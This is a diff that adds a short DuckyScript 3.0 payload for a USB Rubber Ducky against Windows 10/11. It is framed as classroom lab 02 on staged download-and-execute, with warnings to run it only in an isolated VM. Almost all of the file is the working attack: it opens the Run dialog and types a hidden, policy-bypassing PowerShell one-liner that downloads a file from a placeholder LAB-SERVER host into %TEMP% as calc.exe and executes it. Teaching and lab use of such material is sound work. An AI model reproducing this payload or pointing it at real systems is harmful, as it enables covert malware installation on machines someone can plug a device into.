@@ -1,0 +1,18 @@
+REM ============================================================
+REM Lab 02: Staged Download-and-Execute
+REM Target: Windows 10/11, USB Rubber Ducky (DuckyScript 3.0)
+REM
+REM WARNING: Run only against an isolated, snapshotted VM.
+REM Point the URL below at a host on the lab's isolated network
+REM ONLY. Do not use a real internet address in classroom use -
+REM see Lab02 README for why.
+REM
+REM Effect: opens an unelevated PowerShell that downloads a file
+REM from a lab web server to %TEMP% and executes it.
+REM ============================================================
+
+DELAY 1000
+GUI r
+DELAY 200
+STRING powershell -NoP -NonI -W Hidden -Exec Bypass "IEX (New-Object System.Net.WebClient).DownloadFile('http://LAB-SERVER/calc.txt',\"$env:temp\calc.exe\"); Start-Process \"$env:temp\calc.exe\""
+ENTER
